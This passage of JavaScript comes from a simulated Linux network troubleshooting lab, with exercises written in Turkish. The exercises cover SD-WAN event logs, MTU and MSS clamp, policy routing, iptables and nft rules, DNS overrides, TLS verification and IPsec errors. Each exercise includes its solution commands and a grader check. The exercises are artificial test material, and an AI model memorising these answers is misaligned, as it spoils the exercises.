    const ni = args.indexOf('-n'); const n = ni >= 0 ? parseInt(args[ni + 1], 10) : null;
    const cut = s => (n ? join(lines(s).slice(-n)) : s);
    const key = ['strongswan', 'charon', 'ipsec', 'strongswan-starter'].includes(unit) ? 'strongswan' : unit;
    if (key && w.def.units[key]) return ok(cut(w.def.units[key]));
    if ((args.includes('-k') || args.includes('--dmesg')) && this.isRoot && w.def.dmesg) return ok(w.def.dmesg(NET_DMESG));
    return orig.call(this, args, stdin);
  },
  dmesg(w, args, stdin, orig) {
    if (!this.isRoot || !w.def.dmesg) return orig.call(this, args, stdin);
    return ok(w.def.dmesg(NET_DMESG));
  },
  conntrack(w, args, stdin, orig) {
    if (!this.isRoot || !w.def.ct || !(args.includes('-L') || args.includes('--dump'))) return orig.call(this, args, stdin);
    const { vals } = parseOpts(args, 'pds');
    const rows = [
      ['tcp', 6, 431999, 'ESTABLISHED', '192.168.1.10', '192.168.1.42', 51000, 2222, '192.168.1.42', '192.168.1.10', 2222, 51000, '[ASSURED]'],
      ['tcp', 6, 431990, 'ESTABLISHED', '192.168.2.50', '10.50.0.30', 49188, 443, '10.50.0.30', '192.168.1.42', 443, 49188, '[ASSURED]'],
      ['udp', 17, 28, null, '192.168.1.42', '192.168.1.1', 41022, 53, '192.168.1.1', '192.168.1.42', 53, 41022, ''],
      ['udp', 17, 22, null, '192.168.1.42', '203.0.113.53', 58834, 53, '203.0.113.53', '192.168.1.42', 53, 58834, '[UNREPLIED]'],
      w.def.ct,
      ['udp', 17, 179, null, '192.168.1.42', '203.0.113.10', 4500, 4500, '203.0.113.10', '192.168.1.42', 4500, 4500, '[ASSURED]'],
      ['udp', 17, 29, null, '192.168.1.42', '203.0.113.20', 500, 500, '203.0.113.20', '192.168.1.42', 500, 500, ''],
      ['icmp', 1, 29, null, '192.168.1.42', '10.50.0.10', null, null, '10.50.0.10', '192.168.1.42', null, null, ''],
    ].filter(r => (!vals.p || r[0] === vals.p) && (!vals.d || r[5] === vals.d) && (!vals.s || r[4] === vals.s));
    const out = rows.map(r => {
      if (r[0] === 'icmp') return `icmp     1 ${r[2]} src=${r[4]} dst=${r[5]} type=8 code=0 id=2201 src=${r[8]} dst=${r[9]} type=0 code=0 id=2201 mark=0 use=1`;
      const unrep = r[12] === '[UNREPLIED]';
      return `${r[0].padEnd(8)} ${r[1]} ${r[2]} ${r[3] ? r[3] + ' ' : ''}src=${r[4]} dst=${r[5]} sport=${r[6]} dport=${r[7]} ${unrep ? '[UNREPLIED] ' : ''}src=${r[8]} dst=${r[9]} sport=${r[10]} dport=${r[11]} ${r[12] && !unrep ? r[12] + ' ' : ''}mark=0 use=1`;
    });
    return { out: join(out), err: `conntrack v1.4.7 (conntrack-tools): ${out.length} flow entries have been shown.\n`, code: 0 };
  },
};

/* Komutlari sarmalar. Dunya dosyasi yoksa orijinal fonksiyon aynen calisir */
function vopWrap(tbl, names) {
  names.forEach(name => {
    const orig = tbl[name];
    if (typeof orig !== 'function') return;
    tbl[name] = function (args, stdin) {
      const w = vopWorld(this);
      if (!w) return orig.call(this, args, stdin);
      const undo = vopPatch(w);
      try { return VOP_CUSTOM[name] ? VOP_CUSTOM[name].call(this, w, args, stdin, orig) : orig.call(this, args, stdin); }
      finally { undo(); }
    };
  });
}
vopWrap(COMMANDS, ['ip', 'ping', 'traceroute', 'mtr', 'curl', 'journalctl']);
vopWrap(LAB_EXT.commands, ['tracepath', 'arp', 'ethtool', 'nc', 'netcat', 'telnet', 'openssl', 'iptables', 'nft', 'ipsec', 'swanctl', 'conntrack', 'dmesg']);

/* ======================================================================
   SD-WAN branch case. Varyant 1 dunya A, TAC-48377. Varyant 2 dunya B, TAC-48544
   ====================================================================== */

const vopA = patch => sh => { vopNetEnsure(sh, 'A', patch); };
const vopB = patch => sh => { vopNetEnsure(sh, 'B', patch); };
const vopFwOn = (sh, id) => { const w = vopWorld(sh); return !!(w && w.st.id === id && w.st.fw); };
const vopFwGone = (sh, id) => { const w = vopWorld(sh); return !!(w && w.st.id === id && !w.st.fw); };

addVariants('sd1', [
  { title: 'Port seviyesinde kopuş',
    story: "TAC-48377 sana atandı. Aynı branch IST-BR-07, aynı jump box linuxlab, ama başka bir sabah. Ticket ~/tickets altında, ION event log'u portal'dan /var/log/sdwan altına çekilmiş. Bir arızada event'ler zincir halinde gelir, önce port düşer, ardından BFD, sonra vpnlink, en son path switch. Kök sebep zincirin ilk halkasıdır.",
    task: "Ticket'ı oku, sonra ION event log'unda INET-1 fiziksel port'unun düştüğünü gösteren event'in code değerini submit et.",
    hint: "`cat` ile ticket'ı oku, sonra `grep DOWN` ile log'daki bütün düşüş event'lerini listele. Aynı saniyelerde birkaç farklı code göreceksin, BFD ve VPNLINK fiziksel kopuşun sonucudur. DEVICEHW ile başlayan code donanım yani port seviyesini anlatır, zaman damgası da onun zincirde ilk geldiğini gösterir.",
    solution: 'cat ~/tickets/TAC-48377.txt\ngrep DOWN /var/log/sdwan/TAC-48377-ion-events.log\nsubmit DEVICEHW_INTERFACE_DOWN',
    setup: vopA(), check: (sh, c) => vopSub(c, 'DEVICEHW_INTERFACE_DOWN') },
  { title: 'LAN tarafı peering',
    story: "TAC-48544 geldi, yine IST-BR-07. Bu sefer şikayet gece backup'ları ve alarm mail'leri. Ticket ~/tickets altında, ION event log'u /var/log/sdwan altında. Gece hem WAN fabric'te hem LAN tarafında hareket var, hangi event'in neyi anlattığını ayırt etmen lazım.",
    task: "Ticket'ı oku ve ION log'unda LAN tarafındaki core-sw01 ile BGP komşuluğunun düştüğü event'in code değerini submit et.",
    hint: "`grep DOWN` log'daki bütün düşüş event'lerini getirir. Bir kısmı vpnlink yani WAN fabric event'i, biri ise peering, yani ION'un LAN tarafındaki routing komşuluğu. Satırdaki peer_name alanı hangi cihazdan bahsedildiğini söyler, code PEERING ile başlayan büyük harfli bir isim.",
    solution: 'cat ~/tickets/TAC-48544.txt\ngrep DOWN /var/log/sdwan/TAC-48544-ion-events.log\nsubmit PEERING_BGP_DOWN',
    setup: vopB(), check: (sh, c) => vopSub(c, 'PEERING_BGP_DOWN') },
], { hint: "`cat` ile ticket'ı oku, ardından `grep DOWN` ile log'daki düşüş event'lerini süz. Aynı dakikada hem BFD hem VPNLINK event'i göreceksin, BFD tespit mekanizmasıdır, VPNLINK ise secure fabric link'in kendisi. Aradığın code NETWORK_ ile başlıyor ve link'in düştüğünü söylüyor." });

addVariants('sd2', [
  { title: 'SMB sunucusu ayakta mı',
    story: "Ticket'a göre jump box files.corp.lab SMB share'ine bağlanamıyor. Port seviyesine geçmeden önce temel reachability'yi doğrula, ICMP geçiyorsa routing ve tunnel çalışıyor demektir. files.corp.lab hub tarafında, 10.50.0.20 adresinde.",
    task: 'files.corp.lab adresine 3 paket ping at ve kayıpsız döndüğünü gör.',
    hint: "`ping -c` gönderilecek paket sayısını sınırlar, Linux'ta ping kendiliğinden durmaz. İsim verirsen önce DNS ile çözülür, böylece resolver'ı da test etmiş olursun. 0% packet loss L3 yolunun sağlam olduğunu gösterir ama bir TCP port'unun açık olduğunu kanıtlamaz.",
    solution: 'ping -c 3 files.corp.lab\ntraceroute files.corp.lab',
    setup: vopA(), check: (sh, c) => vopRan(c, /^ping\b.*(10\.50\.0\.20|files)/) && / 0% packet loss/.test(c.out) },
  { title: 'Mail sunucusuna yol',
    story: "Alarm mail'leri mail.corp.lab'a gitmiyor. Önce sunucunun kendisine ulaşabiliyor musun, ona bak. Hub'daki mail relay 10.50.0.25 adresinde.",
    task: 'mail.corp.lab adresine 3 paketlik ping at ve paket kaybı olmadığını gör.',
    hint: "`ping -c 3` üç paket gönderip durur, -c vermezsen ping Ctrl+C bekler. ICMP'nin geçmesi routing ve SD-WAN tunnel'ının çalıştığını gösterir. SMTP ayrı bir TCP port'u, ping'in geçmesi 25'in açık olduğu anlamına gelmez.",
    solution: 'ping -c 3 mail.corp.lab\ntraceroute mail.corp.lab',
    setup: vopB(), check: (sh, c) => vopRan(c, /^ping\b.*(10\.50\.0\.25|mail)/) && / 0% packet loss/.test(c.out) },
], { hint: "`ping -c 3` üç paket yollayıp durur, -c vermezsen Linux'ta ping sonsuza kadar sürer. 0% packet loss L3 yolunun ve tunnel'ın çalıştığını gösterir. İstersen `traceroute` ile paketin ION ve hub üzerinden kaç hop'ta gittiğine bak." });

addVariants('sd3', [
  { title: 'En büyük payload',
    story: "Hub'a giden secure fabric'in path MTU'su IPsec overhead yüzünden 1500 değil. Bu sefer tek bir ping'e bakmak yerine payload'u daraltarak sınırı kendin bul. DF set iken fragmentation yasak, sığmayan paket geri döner, sığan geçer.",
    task: 'DF set ping ile 10.50.0.10 adresine kayıpsız geçen en büyük ICMP payload değerini bul ve submit et.',
    hint: "`ping -M do` DF bitini set eder, `-s` ICMP payload boyutunu verir, `-c` paket sayısını sınırlar. 1472 ile başla, Frag needed gelirse payload'u küçült. Geçen en büyük değer path MTU eksi 28'dir, çünkü 20 byte IP ve 8 byte ICMP header payload'un üstüne eklenir.",
    solution: 'ping -M do -s 1472 -c 2 10.50.0.10\nping -M do -s 1373 -c 2 10.50.0.10\nping -M do -s 1372 -c 2 10.50.0.10\nsubmit 1372',
    setup: vopA(), check: (sh, c) => vopSub(c, '1372') },
  { title: 'PPPoE hattı',
    story: "INET-1 arızasında trafik DSL-2'ye geçiyor ve büyük backup upload'ları orada donuyor. DSL modem'e jump box'ın eth2 bacağı bağlı, hat PPPoE. PPPoE her frame'e 8 byte header ekler, bu yüzden böyle hatlarda MTU 1500 olamaz. Jump box bunu biliyor mu, DF set bir ping ile sor.",
    task: "dsl-modem 192.168.100.1 adresine DF set ve 1472 byte payload ile ping at, dönen hatadaki mtu değerini submit et.",
    hint: "`ping -M do` DF bitini set eder, `-s 1472` payload'u 1500 byte'lık pakete tamamlar. Paket daha kernel'den çıkmadan local error alırsan sınır kendi interface'indedir, uzak bir router'dan gelen Frag needed değildir. Aynı değeri `ip link show` ile interface'in mtu alanında da görürsün.",
    solution: 'ping -M do -s 1472 -c 2 192.168.100.1\nip link show eth2\nsubmit 1492',
    setup: vopB(), check: (sh, c) => vopSub(c, '1492') },
], { hint: "`ping -M do` DF bitini set eder, yani yoldaki router paketi bölemez. `-s 1472` payload'a 28 byte IP ve ICMP header eklenince tam 1500 byte eder. Yol daha küçük MTU'ya sahipse ilk darboğaz Frag needed mesajıyla gerçek MTU'yu söyler, `tracepath` da aynı değeri root istemeden bulur." });

addVariants('sd4', [
  { title: 'ICMP yerine ulaşmıyor',
    story: "hmi-01 partner'a SFTP ile batch raporu yüklerken takılıyor. Gece vardiyası eth1 üzerinde capture almış, /var/log/captures/TAC-48377/partner-sftp.pcap. partner-ext IPsec tunnel'ının MTU'su düşük ve jump box bunu hmi-01'e ICMP need to frag ile söylüyor. Ama hmi-01'in Windows firewall'u ICMP'yi drop ettiği için aynı 1448 byte'lık segment tekrar tekrar gidiyor. Kalıcı çözüm tunnel üzerinde MSS clamp.",
    task: "Capture'ı tcpdump ile oku, ICMP mesajındaki mtu değerinden yola çıkarak uygulanması gereken MSS clamp değerini submit et.",
    hint: "`tcpdump -r` kayıtlı capture dosyasını okur, `-n` isim çözmeyi kapatıp IP ve port'ları ham gösterir. ICMP satırındaki mtu değeri yolun taşıyabileceği en büyük IP paketidir. MSS sadece TCP payload'u olduğu için MTU'dan 20 byte IP ve 20 byte TCP header düşülür.",
    solution: 'tcpdump -n -r /var/log/captures/TAC-48377/partner-sftp.pcap\nsubmit 1340',
    setup: vopA(), check: (sh, c) => vopSub(c, '1340') },
  { title: 'SPAN capture',
    story: "Branch IT core-sw01 üzerinde SPAN açıp backup sunucusu bkp01'in portunu jump box'ın eth0'ına mirror'lamış. Capture /var/log/captures/TAC-48544/dsl-backup.pcap, INET-1 kopukken ve trafik DSL-2 fabric'i üzerindeyken alınmış. ION bkp01'e paketin büyük olduğunu ICMP ile söylüyor ama bkp01 dinlemiyor ve aynı segment'i tekrar tekrar yolluyor. ION üzerinde DSL-2 path'i için MSS clamp ayarlanacak.",
    task: "Capture'ı oku ve ICMP mesajındaki mtu değerine göre DSL-2 path'i için doğru MSS clamp değerini submit et.",
    hint: "`tcpdump -n -r` ile dosyayı isim çözmeden oku. Aynı seq aralığıyla tekrar eden 1448 byte'lık segment'ler retransmit, aralarındaki ICMP satırı ise yolun gerçek MTU'sunu söylüyor. ION event log'undaki DSL-2 path mtu değeriyle karşılaştır, sonra 40 byte IP ve TCP header'ı düş.",
    solution: 'tcpdump -n -r /var/log/captures/TAC-48544/dsl-backup.pcap\ngrep "path mtu" /var/log/sdwan/TAC-48544-ion-events.log\nsubmit 1312',
    setup: vopB(), check: (sh, c) => vopSub(c, '1312') },
], { hint: "`tcpdump -n -r` kayıtlı capture'ı isim çözmeden okur. SYN'deki mss 1460 iki tarafın da 1500 MTU sandığını, aynı seq ile tekrar eden 1448 byte'lık segment ise büyük paketlerin yolda kaybolduğunu gösterir. MSS, path MTU'dan 20 byte IP ve 20 byte TCP header düşülerek bulunur." });

addVariants('sd5', [
  { title: 'Vendor VPN yolu',
    story: "Partner firması uzaktan destek için 10.20.0.0/16 subnet'inden bağlanıyor. TAC senden bu trafiğin jump box üzerinde nereden çıktığını teyit etmeni istedi. ip rule, rt_tables ve route table'lara bak, sonra kernel'e doğrudan sor.",
    task: "10.20.0.15 adresine giden trafiğin çıktığı gateway IP'sini ip route get ile bul ve submit et.",
    hint: "`ip rule` hangi trafiğin hangi route table'a bakacağını sırayla listeler, `/etc/iproute2/rt_tables` table numaralarını isimlerle eşler. `ip route get` tahmin yürütmeden kernel'in o hedef için gerçekten seçtiği route'u gösterir. Cevap via kelimesinden sonraki adres, dev alanı da paketin hangi interface'ten çıktığını söyler.",
    solution: 'ip rule\ncat /etc/iproute2/rt_tables\nip route get 10.20.0.15\nsubmit 10.8.0.1',
    setup: vopA(), check: (sh, c) => vopSub(c, '10.8.0.1') },
  { title: 'Kaynağa göre yönlendirme',
    story: "ION'un DSL-2 sağlığını izleyen probe script'i jump box'ta eth2 adresinden, yani 192.168.100.5 kaynağından hub'a gidiyor. Kaynak adres değişince policy routing devreye girer ve bambaşka bir table'a bakılır. Probe'un gerçekten DSL modem üzerinden çıktığını doğrula.",
    task: "ip route get ile 192.168.100.5 kaynağından 10.50.0.10 adresine giden trafiğin gateway'ini bul ve submit et.",
    hint: "`ip rule` içindeki from 192.168.100.5 satırı bu kaynağın dsl table'ına baktığını söyler. `ip route get` komutuna from parametresiyle kaynak adres verirsen kernel'in policy routing dahil vereceği kararı görürsün. from vermezsen main table kullanılır ve yanlış cevaba gidersin.",
    solution: 'ip rule\nip route show table dsl\nip route get 10.50.0.10 from 192.168.100.5\nsubmit 192.168.100.1',
    setup: vopB(), check: (sh, c) => vopSub(c, '192.168.100.1') },
], { hint: "`ip rule` trafiğin hangi route table'a bakacağını öncelik sırasıyla listeler, `/etc/iproute2/rt_tables` numaraları isimlerle eşler. `ip route show table` ardından 100 yazınca ikinci table'ın içeriği görünür. `ip route get` ise kernel'in o hedef için gerçekten seçtiği yolu söyler, cevap via kelimesinden sonraki adres." });

addVariants('sd6', [
  { title: 'Cutover kalıntısı',
    story: "Routing temiz, files.corp.lab ping'e cevap veriyor ama SMB yani 445 açılmıyor. Ticket'ta dün gece cutover script'i koşulduğu yazıyor. iptables ile chain'leri oku, pkts sütunu hangi rule'un trafik yediğini söyler. OUTPUT ve FORWARD bir custom chain'e jump ediyor olabilir.",
    task: "445 portuna giden trafiği DROP eden rule'un bulunduğu chain'in adını submit et.",
    hint: "`iptables -L` chain'leri listeler, `-n` isim ve port çözmeyi kapatır, `-v` paket ve byte sayaçlarını ekler. Firewall okumak bile root ister, bu yüzden `sudo` gerekir. DROP satırını bul, ait olduğu chain üstteki Chain başlığında yazar. -n vermezsen port numarası yerine servis adını görürsün.",
    solution: 'sudo iptables -L -n -v\nsubmit CUTOVER-HOLD',
    setup: vopA({ fw: 1 }), check: (sh, c) => vopSub(c, 'CUTOVER-HOLD') },
  { title: 'Egress hardening',
    story: "mail.corp.lab ping'e cevap veriyor ama alarm mail'leri hâlâ gitmiyor. Ticket notunda geçen hafta egress hardening yapıldığı yazıyor. Spam botlarına karşı outbound SMTP'yi kesmek yaygın bir adımdır, ama iç relay'i istisna etmeyi unutursan kendi alarmlarını da kesersin.",
    task: "25 portuna giden trafiği DROP eden rule'un bulunduğu chain'in adını submit et.",
    hint: "`iptables -L` komutu `-n` ve `-v` ile tüm chain'leri sayaçlarıyla gösterir, root ister. -n olmadan iptables 25'i smtp olarak yazar, ikisi aynı şey. OUTPUT chain'indeki jump hedefini takip et, DROP satırı o custom chain'in altında. `iptables -S` aynı kuralları eklendikleri komut biçiminde verir.",
    solution: 'sudo iptables -L -n -v\nsudo iptables -S\nsubmit EGRESS-SMTP',
    setup: vopB({ fw: 1 }), check: (sh, c) => vopSub(c, 'EGRESS-SMTP') },
], { hint: "`iptables -L` chain'leri listeler, `-n` isim çözmeyi kapatır, `-v` paket ve byte sayaçlarını gösterir. Firewall okumak bile root ister, `sudo` şart. DROP satırını bul, ait olduğu chain üstteki Chain başlığında yazar, OUTPUT ve FORWARD oraya sadece jump ediyor." });

addVariants('sd7', [
  { title: 'SMB timeout',
    story: "Rule'u gördün, şimdi semptomla eşleştir. DROP SYN'i sessizce yutar, client timeout'a düşer. Kapalı port ya da REJECT ise hemen Connection refused döner. 445 ile 139'u yan yana koyunca fark netleşir.",
    task: 'nc ile 10.50.0.20 adresinin 445 portunu test et ve timeout aldığını gör. Kıyas için 139 portunu da dene.',
    hint: "`nc -z` veri göndermeden sadece TCP bağlantısı kurmayı dener, `-v` sonucu yazdırır. timed out yolda bir DROP olduğunu, refused ise host'a ulaşıldığını ama o portta dinleyen olmadığını gösterir. Bu ayrım firewall mı servis mi sorusunun cevabıdır.",
    solution: 'nc -zv 10.50.0.20 445\nnc -zv 10.50.0.20 139',
    setup: vopA({ fw: 1 }),
    check: (sh, c) => vopRan(c, /^(nc|netcat|telnet)\b/) && /(10\.50\.0\.20|files\.corp\.lab|files)\s+445(\s|$)/.test(c.line) && vopFwOn(sh, 'A') },
  { title: 'SMTP timeout',
    story: "EGRESS-SMTP rule'u ile semptomu eşleştir. Relay 587 submission portunda da dinliyor, kıyas için onu da dene. Biri timeout, diğeri farklı bir şey diyecek.",
    task: 'nc ile 10.50.0.25 adresinin 25 portunu test et ve timeout aldığını gör. Kıyas için 587 portunu da dene.',
    hint: "`nc -zv` hedefe sadece TCP handshake dener ve sonucu yazar. timed out cevabı SYN'in bir yerde sessizce düştüğünü söyler, bu tipik bir DROP rule'udur. 587 bu dünyada farklı cevap veriyorsa sorun relay'de değil, aradaki filtrede demektir.",
    solution: 'nc -zv 10.50.0.25 25\nnc -zv 10.50.0.25 587',
    setup: vopB({ fw: 1 }),
    check: (sh, c) => vopRan(c, /^(nc|netcat|telnet)\b/) && /(10\.50\.0\.25|mail\.corp\.lab|mail)\s+25(\s|$)/.test(c.line) && vopFwOn(sh, 'B') },
], { hint: "`nc -z` veri göndermeden sadece TCP bağlantısı dener, `-v` sonucu yazdırır. timed out yoldaki bir DROP'u, refused ise host'a ulaşıldığını ama portta dinleyen olmadığını gösterir. 8443 ile 443'ü yan yana test edince fark netleşir." });

addVariants('sd8', [
  { title: "CUTOVER-HOLD'u kaldır",
    story: "Branch IT onay verdi, CUTOVER-HOLD cutover sonrası kaldırılmayı unutulmuş. Rule'u sil ve 445'in artık succeeded dediğini doğrula. iptables ile rule numarasıyla ya da tam spec ile silebilirsin.",
    task: "CUTOVER-HOLD chain'indeki DROP rule'unu sil ve nc ile 445'i tekrar test et.",
    hint: "`iptables -D` bir chain'den rule siler, chain adından sonra ya rule numarası ya da eklerken kullanılan spec'in aynısı verilir. Chain'de tek rule olduğu için numarası 1, root yetkisi de gerekir. Ardından `nc -zv` ile testi tekrarla, timed out yerine succeeded görmelisin.",
    solution: 'sudo iptables -D CUTOVER-HOLD 1\nnc -zv 10.50.0.20 445\nsudo iptables -L CUTOVER-HOLD -n -v',
    setup: vopA({ fw: 1 }), check: sh => vopFwGone(sh, 'A') },
  { title: 'nft ile sil',
    story: "Selin onay verdi, iç relay'e giden SMTP serbest kalmalı. Bu sefer nftables tarafından çalış, iptables zaten arka planda nf_tables'a yazıyor. nft rule'ları handle numarasıyla silinir.",
    task: "EGRESS-SMTP chain'indeki DROP rule'unu nft ile handle numarasından sil, sonra nc ile 25'i tekrar test et.",
    hint: "`nft -a list ruleset` her rule'un sonuna handle numarasını ekler, -a olmadan handle görünmez. Silme komutu `nft delete rule` ardından family, table, chain ve handle numarası ister. Sildikten sonra `nc -zv` ile 25 portunun succeeded dediğini gör.",
    solution: 'sudo nft -a list ruleset\nsudo nft delete rule ip filter EGRESS-SMTP handle 7\nnc -zv 10.50.0.25 25',
    setup: vopB({ fw: 1 }), check: sh => vopFwGone(sh, 'B') },
], { hint: "`iptables -D` chain adından sonra rule numarası ya da eklerken kullanılan spec'in aynısını alır, HUB-BLOCK'ta tek rule olduğu için numarası 1. nftables tercih edersen `nft -a list ruleset` handle numaralarını gösterir ve `nft delete rule` ile silersin. Sonra `nc -zv` ile 8443'ün succeeded dediğini doğrula." });

addVariants('sd9', [
  { title: 'Override edilmiş DNS',
    story: "historian-sync hâlâ could not resolve diyor. Sistem resolver'ı ION'u gösteriyor ve dig files.corp.lab düzgün cevap veriyor. Demek ki servis kendi DNS'ini kullanıyor. journalctl -u historian-sync, /opt/historian-sync altındaki config ve /var/log/captures/TAC-48377/historian-dns.pcap aynı hikayeyi anlatıyor.",
    task: "historian-sync'in sorgu attığı, cevap vermeyen DNS server IP'sini bul ve submit et.",
    hint: "`tcpdump -r` ile capture'ı oku, sonuna `port 53` filtresi koyarsan sadece DNS paketleri kalır. Cevabı hiç gelmeyen ve aynı query ID ile tekrar gönderilen sorguların hedef adresine bak. `grep -r` bir dizini recursive tarar ve config'deki override satırını bulur, `dig` ile o sunucuya doğrudan sorarak cevap vermediğini teyit edersin.",
    solution: 'tcpdump -n -r /var/log/captures/TAC-48377/historian-dns.pcap port 53\ngrep -r dns /opt/historian-sync\njournalctl -u historian-sync\ndig @198.51.100.53 files.corp.lab\nsubmit 198.51.100.53',
    setup: vopA(), check: (sh, c) => vopSub(c, '198.51.100.53') },
  { title: 'Emekli DC',
    story: "Gece backup job'ları could not resolve ile düşüyor. bkp-agent kendi nameserver ayarını taşıyor ve sistem resolver'ını yok sayıyor. Ticket notunda eski branch DC'nin emekliye ayrıldığı yazıyor, bu bir ipucu. Servis log'una, /opt/bkp-agent altındaki config'e ve /var/log/captures/TAC-48544/bkp-dns.pcap'e bak.",
    task: "bkp-agent'ın sorgu attığı, cevap vermeyen DNS server IP'sini bul ve submit et.",
    hint: "`journalctl -u` belirli bir servisin log'unu getirir, bkp-agent hangi nameserver'ı kullandığını kendisi yazıyor. `tcpdump -n -r` ile capture'ı `port 53` filtresiyle oku, cevapsız kalan sorguların hedefi aynı adres olmalı. `grep -r` ile config'te o satırı bulup kaynağını da kanıtlarsın.",
    solution: 'journalctl -u bkp-agent\ngrep -r nameserver /opt/bkp-agent\ntcpdump -n -r /var/log/captures/TAC-48544/bkp-dns.pcap port 53\nsubmit 192.168.1.99',
    setup: vopB(), check: (sh, c) => vopSub(c, '192.168.1.99') },
], { hint: "`tcpdump -n -r` ile dns.pcap'i oku ve `port 53` filtresiyle sadece DNS kalsın. Aynı query ID ile tekrar gönderilip cevabı gelmeyen sorguların hedef adresi aradığın sunucu. `grep -r` /opt/erp-agent altındaki config'te override satırını bulur, `dig` ile o sunucuya doğrudan sorup cevap vermediğini teyit edersin." });

addVariants('sd10', [
  { title: 'Yanlış isim',
    story: "Ticket'ta files.corp.lab HTTPS açılınca tarayıcının uyardığı yazıyor. Sertifika süresi mi dolmuş, isim mi uymuyor, CA mı güvenilmez? openssl s_client ile handshake'i kendin yap, Verify return code satırı cevabı verir. Sertifikanın içindeki isimleri openssl x509 ile de görebilirsin.",
    task: 'openssl s_client ile files.corp.lab 443 handshake yap ve Verify return code sayısını submit et.',
    hint: "`openssl s_client -connect` host ve port'u iki nokta ile birleşik tek argument olarak alır. `-servername` SNI gönderir ve openssl'e hangi isme göre doğrulama yapacağını söyler, vermezsen isim kontrolü atlanabilir. Çıktının sonundaki Verify return code 0 ise her şey yolunda, başka bir sayı ise yanındaki açıklama sorunu söyler.",
    solution: 'openssl s_client -connect files.corp.lab:443 -servername files.corp.lab\nopenssl x509 -in /opt/app/certs/files.crt -noout -subject -ext subjectAltName\nsubmit 62',
    setup: vopA(), check: (sh, c) => vopSub(c, '62', 'hostname mismatch') },
  { title: 'Sertifika masum mu',
    story: "Kullanıcılar portal.corp.lab için sertifika uyarısı aldıklarını söylüyor. Önce sunucu tarafını ya temize çıkar ya da suçla. Handshake'te verify başarılıysa sorun büyük ihtimalle client tarafında, eksik bir CA ya da araya giren bir proxy.",
    task: 'openssl s_client ile portal.corp.lab 443 handshake yap ve Verify return code sayısını submit et.',
    hint: "`openssl s_client -connect` ile TLS handshake'i elle yaparsın, `-servername` SNI ve hostname doğrulaması için gerekli. Verify return code 0 sertifikanın süresinin, isminin ve zincirinin doğru olduğu anlamına gelir. Teyit için `openssl x509` ile `-noout -dates` vererek dosyadaki tarihleri de okuyabilirsin.",
    solution: 'openssl s_client -connect portal.corp.lab:443 -servername portal.corp.lab\nopenssl x509 -in /opt/app/certs/portal.crt -noout -dates\nsubmit 0',
    setup: vopB(), check: (sh, c) => vopSub(c, '0', 'ok') },
], { hint: "`openssl s_client -connect` host ve port'u iki nokta ile birleşik tek argument olarak alır, `-servername` SNI gönderir ve isim doğrulamasını mümkün kılar. Çıktının sonundaki Verify return code 0 ise sorun yok, başka bir sayı ise yanındaki açıklama sebebi söyler. `openssl x509 -noout -dates` ile dosyadaki geçerlilik tarihlerini de okuyabilirsin." });

addVariants('sd11', [
  { title: 'DR tunnel',
    story: "Son madde, yeni dr-site IPsec tunnel'ı kalkmıyor. Tanımı /etc/ipsec.d/dr-site.conf içinde. Proposal'lar bu sefer uyumlu, IKE_SA_INIT geçiyor, sorun bir sonraki adımda, IKE_AUTH'ta. ipsec statusall ile SA durumuna, journalctl -u strongswan ile peer'ın cevabına bak. Ticket'taki PSK notu ve /opt/dr-site/onboarding.txt sebebi açıklar.",
    task: "Peer'ın dr-site için döndürdüğü IKE notify hatasının adını submit et.",
    hint: "`ipsec statusall` charon'a socket üzerinden bağlanır, bu yüzden `sudo` ister. `journalctl -u` strongswan unit'inin log'unu getirir, `grep -i notify` ile peer'ın hata bildirimlerini süzebilirsin ama log'da TAC-48213'ten kalma cloud-lab satırları da var, tarihe ve conn adına dikkat et. IKE_SA_INIT geçip IKE_AUTH'ta gelen bir hata genelde kimlik doğrulamayı, yani PSK ya da ID'yi işaret eder.",
    solution: 'sudo ipsec statusall\njournalctl -u strongswan\ncat /etc/ipsec.d/dr-site.conf\ncat /opt/dr-site/onboarding.txt\nsubmit AUTHENTICATION_FAILED',
    setup: vopA(), check: (sh, c) => vopSub(c, 'AUTHENTICATION_FAILED', 'AUTH_FAILED') },
  { title: 'Up ama trafik yok',
    story: "HMI tedarikçisinin uzaktan bakım tunnel'ı ot-vendor IKE seviyesinde ESTABLISHED görünüyor, ama altında hiç CHILD_SA yok, yani trafiği taşıyacak IPsec SA kurulmamış. Proposal'lar uyumlu, peer başka bir şeye itiraz ediyor. Tanım /etc/ipsec.d/ot-vendor.conf içinde, statusall çıktısını, strongswan log'unu ve /opt/ot-vendor/onboarding.txt'i karşılaştır.",
    task: "Peer'ın CHILD_SA kurulumunu reddederken döndürdüğü notify hatasının adını submit et.",
    hint: "`ipsec statusall` çıktısında, sudo ile çalıştırdığında, ot-vendor için ESTABLISHED satırı var ama INSTALLED satırı yok, bu IKE_SA'nın kalktığını ama CHILD_SA'nın kalkmadığını gösterir. `journalctl -u` ile strongswan unit'inin log'unda notify mesajlarını oku, eski cloud-lab satırlarını karıştırma. Traffic selector conn tanımındaki leftsubnet ve rightsubnet'ten gelir ve peer'ın izin verdiğiyle birebir eşleşmelidir.",
    solution: 'sudo ipsec statusall\njournalctl -u strongswan\ncat /etc/ipsec.d/ot-vendor.conf\ncat /opt/ot-vendor/onboarding.txt\nsubmit TS_UNACCEPTABLE',
    setup: vopB(), check: (sh, c) => vopSub(c, 'TS_UNACCEPTABLE', 'TS_UNACCEPT') },
], { hint: "`ipsec statusall` charon'a socket üzerinden bağlandığı için `sudo` ister ve hangi SA'nın ESTABLISHED, hangisinin CONNECTING olduğunu gösterir. `journalctl -u` ile strongswan unit'inin log'u peer'ın IKE_SA_INIT cevabını içerir, notify hatası büyük harfli ve alt çizgili bir isimdir. ipsec.conf'taki ike satırını onboarding dokümanındaki kabul edilen proposal ile karşılaştır." });

addVariants('sd12', [
  { title: 'Root cause',
    story: "Ticket'ı kapatma zamanı. INET-1 port seviyesinde kopmuş ve yirmi dakikada geri gelmiş. Partner SFTP sorunu tunnel MTU ve eksik MSS clamp. historian-sync config'inde eski bir DNS override var. files sertifikasında isim uymuyor, dr-site PSK'sı eski. Peki jump box ve historian'ın SMB share'ine hiç ulaşamamasının asıl sebebi neydi?",
    task: "files.corp.lab 445 erişim kesintisinin root cause'unu tek kelimeyle submit et.",
    hint: "Cutover script'inin geride bıraktığı şeyi düşün, ping geçiyordu ama 445 timeout veriyordu. Paketi sessizce düşüren katman Linux'un netfilter'ı. iptables, firewall ya da chain adı kabul edilir.",
    solution: 'submit iptables',
    setup: vopA(), check: (sh, c) => vopSub(c, 'iptables', 'firewall', 'cutover-hold', 'drop', 'netfilter', 'nftables', 'iptables drop', 'firewall rule', 'drop rule') },
  { title: 'Backup neden düştü',
